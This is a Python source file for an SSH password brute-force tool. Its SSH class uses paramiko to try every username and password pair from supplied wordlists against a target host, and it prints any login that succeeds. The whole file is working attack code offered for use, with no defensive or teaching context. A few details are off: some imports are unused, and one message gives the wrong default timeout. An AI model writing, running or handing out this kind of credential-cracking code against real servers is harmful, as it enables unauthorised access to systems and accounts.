import os
import sys
import paramiko
from tqdm import tqdm

class SSH:
    def __init__(self):
        self.user = []
        self.pasw = []
        self.host = None
        self.log = False
        self.ssh = paramiko.SSHClient()
        self.ussh = ""
        self.pssh = ""
        self.port = 22
        self.timeout = 2
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def crack(self):
        if self.host:
            count = 0
            found = False
            error = False
            for user in self.user:
                if error == True:
                    break
                if found == True:
                    break
                for pasw in self.pasw:
                    try:
                        self.ssh.connect(self.host, username=user, password=pasw, port=self.port, banner_timeout=self.timeout)
                        found = True
                        self.ussh = user
                        self.pssh = pasw
                        break
                    except paramiko.ssh_exception.AuthenticationException:
                        print ("[!] Trying " + user + ":" + pasw)
                    except paramiko.ssh_exception.NoValidConnectionsError:
                        print ("[-] Failed connect to %s:%d" % (self.host, self.port))
                        sys.exit()
            if found != True:
                print ("[!] Password not found")
                self.ssh.close()
            else:
                print ("---- Session found ----")
                print ("User: " + self.ussh)
                print ("Pass: " + self.pssh)
                self.ssh.close()
        else:
            print ("[-] Hostname or Target not found, please insert target!")

    def setUser(self, word):
        if len(word) > 0:
            self.user = word
            if self.log:
                print ("[*] The User has been read")
        else:
            print ("[!] The user list cannot be read")
            sys.exit()

    def setPass(self, word):
        if len(word) > 0:
            self.pasw = word
            if self.log:
                print ("[*] The Pass has been read")
        else:
            print ("[!] The password list cannot be read")
            sys.exit()

    def setHostPort(self, host):
        if ":" in host:
            split = host.split(":")
            self.host = split[0]
            self.port = int(split[1])
        else:
            self.host = host
            print ("[*] Default port 22")

    def setTimeout(self, timeout):
        if timeout:
            self.timeout = int(timeout)
        else:
            print ("[*] Default timeout 200")
    def setLog(self, type):
        self.log = type
